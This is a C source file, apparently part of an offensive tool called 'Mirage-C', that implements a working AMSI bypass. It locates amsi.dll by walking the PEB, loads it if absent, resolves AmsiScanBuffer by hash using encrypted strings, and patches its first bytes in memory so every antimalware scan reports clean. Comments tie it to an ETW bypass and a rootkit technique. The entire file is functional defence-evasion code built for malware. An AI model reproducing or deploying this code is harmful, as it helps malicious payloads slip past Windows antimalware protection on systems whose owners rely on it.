/*
 * amsi_bypass.c — AMSI bypass for Mirage-C
 *
 * In-memory byte patch (PHANTOM-ROOTKIT technique, CRT-free adaptation):
 * resolves amsi.dll!AmsiScanBuffer and overwrites its prologue with
 * {0x33, 0xC0, 0xC3} (xor eax,eax; ret) via mirage_NtProtectVirtualMemory
 * + a plain byte loop + mirage_NtFlushInstructionCache.
 *
 * Process-wide, no debug registers, no VEH — replaces the old DR0+VEH
 * scheme that collided with the ETW bypass (both set DR0) and only
 * protected the calling thread.
 *
 * amsi.dll is delay-loaded in most hosts: if it is not in the PEB module
 * list, LoadLibraryA is resolved from kernel32 (also via PEB) and called.
 */

#include "amsi_bypass.h"
#include "engine.h"
#include "config.h"

#ifdef ENABLE_AMSI_BYPASS
#include "peb.h"
#include "export_resolve.h"
#include "hash.h"
#include "nt_types.h"
#include "enc_strings.h"
#include <windows.h>

/* xor eax,eax; ret — AmsiScanBuffer returns AMSI_RESULT_CLEAN (0) */
static const uint8_t AMSI_PATCH[3] = {0x33, 0xC0, 0xC3};

/* ── Helper: resolve function from module by hash ─────────── */

static void* resolve_func(void* mod, const char* name) {
    uint32_t h = mirage_encrypted_hash_func(name);
    return mirage_get_function_by_hash(mod, h);
}

/* ── Helper: patch 3 bytes at addr with protection flip ───── */

static int patch_bytes(void* addr) {
    PVOID  base = addr;
    SIZE_T size = sizeof(AMSI_PATCH);
    ULONG  old  = 0;
    NTSTATUS st = mirage_NtProtectVirtualMemory(
        (HANDLE)(intptr_t)(-1), &base, &size, PAGE_EXECUTE_READWRITE, &old);
    if (st < 0) return 0;

    uint8_t* dst = (uint8_t*)addr;
    for (size_t i = 0; i < sizeof(AMSI_PATCH); i++)
        dst[i] = AMSI_PATCH[i];

    base = addr;
    size = sizeof(AMSI_PATCH);
    mirage_NtProtectVirtualMemory((HANDLE)(intptr_t)(-1), &base, &size,
                                  old, &old);
    mirage_NtFlushInstructionCache((HANDLE)(intptr_t)(-1), addr,
                                   sizeof(AMSI_PATCH));
    return 1;
}

/* ── mirage_patch_amsi ────────────────────────────────────── */

int mirage_patch_amsi(void) {
    /* Locate amsi.dll via PEB walk */
    char dll[16];
    enc_decrypt(enc_amsi_dll, ENC_AMSI_DLL_LEN, dll);
    uint32_t mod_hash = mirage_encrypted_hash_module(dll);
    void* amsi = mirage_get_module_by_hash(mod_hash);

    if (!amsi) {
        /* amsi.dll is delay-loaded in most hosts: resolve LoadLibraryA
         * from kernel32 via PEB, load amsi.dll, then re-walk the PEB. */
        char k32[16];
        enc_decrypt(enc_kernel32, ENC_KERNEL32_LEN, k32);
        void* kernel32 = mirage_get_module_by_hash(
            mirage_encrypted_hash_module(k32));
        if (!kernel32) return 0;

        char fn[32];
        enc_decrypt(enc_LoadLibraryA, ENC_LOADLIBRARYA_LEN, fn);
        typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
        pLoadLibraryA pLLA = (pLoadLibraryA)resolve_func(kernel32, fn);
        if (!pLLA) return 0;
        if (!pLLA(dll)) return 0;

        amsi = mirage_get_module_by_hash(mod_hash);
        if (!amsi) return 0;
    }

    /* Resolve AmsiScanBuffer */
    char amsi_fn[32];
    enc_decrypt(enc_AmsiScanBuffer, ENC_AMSISCANBUFFER_LEN, amsi_fn);
    void* scan_buffer = resolve_func(amsi, amsi_fn);
    if (!scan_buffer) return 0;

    return patch_bytes(scan_buffer);
}

#endif /* ENABLE_AMSI_BYPASS */
